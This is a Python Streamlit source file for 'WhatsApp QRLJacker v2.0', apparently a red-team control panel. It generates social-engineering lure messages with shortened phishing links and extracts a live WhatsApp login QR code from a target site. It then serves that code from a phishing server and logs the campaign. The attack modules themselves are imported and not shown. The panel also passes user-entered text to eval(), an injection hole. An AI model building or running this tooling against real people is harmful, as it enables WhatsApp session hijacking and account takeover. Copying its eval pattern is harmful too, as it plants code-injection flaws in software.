import streamlit as st
import threading
import subprocess
import os
from phishing_server import start_phishing_server
from qr_extractor import extract_qr_code
from lure import generate_lure_message, generate_short_url
from utils import load_config, setup_logging, get_timestamp

def main():
    # Load configuration
    config = load_config("config/config.yaml")
    setup_logging(config["log_file"])

    # Streamlit page configuration with modern dark theme
    st.set_page_config(
        page_title="WhatsApp QRLJacker",
        page_icon="🔐",
        layout="wide",
        initial_sidebar_state="expanded"
    )

    # Enhanced Cyberpunk Dark Theme CSS
    st.markdown("""
    <style>
    :root {
        --primary: #00ff9f;
        --secondary: #7b2dff;
        --dark-bg: #0f172a;
        --darker-bg: #0b1120;
        --card-bg: #1e293b;
        --text-primary: #f8fafc;
        --text-secondary: #94a3b8;
    }
    
    body {
        background-color: var(--dark-bg);
        color: var(--text-primary);
        font-family: 'Inter', sans-serif;
    }
    
    .stApp {
        background: linear-gradient(135deg, var(--dark-bg) 0%, var(--darker-bg) 100%);
    }
    
    /* Buttons */
    .stButton>button {
        background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
        color: #0d1117;
        border: none;
        padding: 12px 24px;
        border-radius: 8px;
        font-weight: 600;
        transition: all 0.3s ease;
        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
    }
    
    .stButton>button:hover {
        transform: translateY(-2px);
        box-shadow: 0 6px 8px rgba(0, 0, 0, 0.15);
    }
    
    /* Input fields */
    .stTextInput>div>div>input,
    .stSelectbox>div>div>select,
    .stTextArea>div>div>textarea {
        background-color: var(--card-bg);
        color: var(--text-primary);
        border: 1px solid #334155;
        border-radius: 8px;
        padding: 10px 12px;
    }
    
    /* Sidebar */
    .stSidebar {
        background-color: var(--darker-bg);
        border-right: 1px solid #1e293b;
    }
    
    /* Cards */
    .stAlert, .stMarkdown, .stExpander {
        background-color: var(--card-bg);
        border-radius: 12px;
        padding: 16px;
        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        border: 1px solid #334155;
    }
    
    /* QR Code Image */
    .css-1v0mbdj img {
        border: 2px solid var(--primary);
        border-radius: 12px;
        box-shadow: 0 8px 16px rgba(0, 255, 159, 0.1);
        transition: all 0.3s ease;
    }
    
    .css-1v0mbdj img:hover {
        transform: scale(1.02);
        box-shadow: 0 12px 20px rgba(0, 255, 159, 0.2);
    }
    
    /* Typography */
    h1, h2, h3, h4, h5, h6 {
        color: var(--primary);
        font-family: 'Space Mono', monospace;
        font-weight: 700;
    }
    
    /* Log Box */
    .log-box {
        background-color: var(--darker-bg);
        border: 1px solid var(--primary);
        border-radius: 8px;
        padding: 12px;
        max-height: 300px;
        overflow-y: auto;
        font-family: 'Fira Code', monospace;
        font-size: 14px;
        color: var(--text-primary);
    }
    
    /* Tabs */
    .stTabs [data-baseweb="tab-list"] {
        gap: 8px;
    }
    
    .stTabs [data-baseweb="tab"] {
        background-color: var(--card-bg);
        border-radius: 8px 8px 0 0;
        padding: 8px 16px;
        margin-right: 0 !important;
    }
    
    .stTabs [aria-selected="true"] {
        background-color: var(--primary);
        color: #0d1117;
    }
    
    /* Status indicators */
    .success {
        color: var(--primary);
    }
    
    .error {
        color: #ff2d55;
    }
    
    /* Custom scrollbar */
    ::-webkit-scrollbar {
        width: 8px;
    }
    
    ::-webkit-scrollbar-track {
        background: var(--darker-bg);
    }
    
    ::-webkit-scrollbar-thumb {
        background: var(--primary);
        border-radius: 4px;
    }
    </style>
    """, unsafe_allow_html=True)

    # Sidebar with enhanced design
    with st.sidebar:
        st.image("static/whatsappqr_logo.png", width=180, caption="WhatsApp QRLJacker v2.0")
        st.markdown("<h2 style='text-align: center; margin-bottom: 0;'>⚡ Control Panel</h2>", unsafe_allow_html=True)
        st.markdown("<p style='text-align: center; color: var(--text-secondary); margin-top: 0;'>Red Team Operations</p>", unsafe_allow_html=True)
        
        st.markdown("---")
        
        # Status indicator
        server_status = "🟢 Running" if 'server_process' in st.session_state and st.session_state.server_process else "🔴 Stopped"
        st.markdown(f"""
        <div style="background-color: var(--card-bg); padding: 12px; border-radius: 8px; margin-bottom: 16px;">
            <p style="margin: 0; color: var(--text-secondary);">System Status</p>
            <h3 style="margin: 0;">{server_status}</h3>
            <p style="margin: 0; font-size: 0.8rem; color: var(--text-secondary);">{get_timestamp()}</p>
        </div>
        """, unsafe_allow_html=True)
        
        st.markdown("---")
        
        # Settings
        st.markdown("### ⚙️ Campaign Settings")
        lure_type = st.selectbox(
            "Lure Type",
            ["group_invite", "channel_promo", "urgent_login"],
            index=["group_invite", "channel_promo", "urgent_login"].index(config["lure_type"]),
            help="Select social engineering pretext"
        )
        
        st.markdown("---")
        
        # Quick actions
        st.markdown("### ⚡ Quick Actions")
        if st.button("🔄 Refresh Logs", key="refresh_btn"):
            st.experimental_rerun()
        
        st.markdown("---")
        st.markdown("<p style='font-size: 0.8rem; color: var(--text-secondary); text-align: center;'>For authorized testing only</p>", unsafe_allow_html=True)

    # Main content with tabs
    tab1, tab2, tab3 = st.tabs(["📱 Lure Generator", "🖥️ Server Control", "📜 Activity Logs"])

    with tab1:
        st.markdown("<h2 style='margin-top: 0;'>Lure Generator</h2>", unsafe_allow_html=True)
        
        col1, col2 = st.columns([3, 1])
        with col1:
            custom_context = st.text_area("Custom Context (JSON)", '{"name": "Target", "org": "Company Inc."}', height=120)
        
        with col2:
            st.markdown("<div style='height: 20px;'></div>", unsafe_allow_html=True)
            if st.button("Generate Lure", key="generate_lure"):
                try:
                    context = eval(custom_context) if isinstance(custom_context, str) else custom_context
                    lure_message = generate_lure_message(lure_type, context).format(url=generate_short_url(config["phishing_url"]))
                    st.session_state.lure_message = lure_message
                except Exception as e:
                    st.error(f"Error generating lure: {str(e)}")
        
        if 'lure_message' in st.session_state:
            st.markdown("### Generated Lure Message")
            st.code(st.session_state.lure_message, language="text")
            
            st.download_button(
                label="📥 Download Lure",
                data=st.session_state.lure_message,
                file_name="whatsapp_lure.txt",
                mime="text/plain"
            )

    with tab2:
        st.markdown("<h2 style='margin-top: 0;'>Server Control Center</h2>", unsafe_allow_html=True)
        
        col1, col2 = st.columns(2)
        with col1:
            st.markdown("### QR Code Operations")
            if st.button("🚀 Start Phishing Server", key="start_server"):
                with st.spinner("Extracting QR code and starting server..."):
                    qr_data = extract_qr_code(config["target_url"], config["qr_image_path"])
                    if qr_data:
                        st.session_state.server_process = threading.Thread(
                            target=start_phishing_server,
                            args=(config["phishing_port"], config["qr_image_path"]),
                            daemon=True
                        )
                        st.session_state.server_process.start()
                        st.success("Phishing server started successfully!")
                        st.session_state.qr_extracted = True
                    else:
                        st.error("Failed to extract QR code")
            
            if st.button("🛑 Stop Server", key="stop_server"):
                if 'server_process' in st.session_state and st.session_state.server_process:
                    subprocess.run(["pkill", "-f", f"port {config['phishing_port']}"])
                    st.session_state.server_process = None
                    st.success("Server stopped successfully")
                else:
                    st.warning("No active server to stop")
        
        with col2:
            if 'qr_extracted' in st.session_state and st.session_state.qr_extracted:
                st.markdown("### Generated QR Code")
                st.image(config["qr_image_path"], use_column_width=True, caption="WhatsApp Phishing QR Code")
                st.download_button(
                    label="📥 Download QR Code",
                    data=open(config["qr_image_path"], "rb").read(),
                    file_name="whatsapp_qr.png",
                    mime="image/png"
                )
        
        st.markdown("---")
        st.markdown("### Server Information")
        st.markdown(f"""
        - **Phishing URL**: `{config['phishing_url']}`
        - **Target URL**: `{config['target_url']}`
        - **Port**: `{config['phishing_port']}`
        - **Campaign ID**: `{config.get('campaign_id', 'WA-QRL-001')}`
        """)

    with tab3:
        st.markdown("<h2 style='margin-top: 0;'>Operation Logs</h2>", unsafe_allow_html=True)
        
        if os.path.exists(config["log_file"]):
            with open(config["log_file"], "r") as f:
                log_content = f.read()
                st.markdown(f"""
                <div class="log-box">
                    <pre>{log_content}</pre>
                </div>
                """, unsafe_allow_html=True)
            
            col1, col2 = st.columns([1, 1])
            with col1:
                st.download_button(
                    label="📥 Download Logs",
                    data=log_content,
                    file_name="qrljacker_logs.txt",
                    mime="text/plain"
                )
            with col2:
                if st.button("🧹 Clear Logs", key="clear_logs"):
                    open(config["log_file"], "w").close()
                    st.experimental_rerun()
        else:
            st.info("No log file found. Logs will appear here once operations begin.")

if __name__ == "__main__":
    main()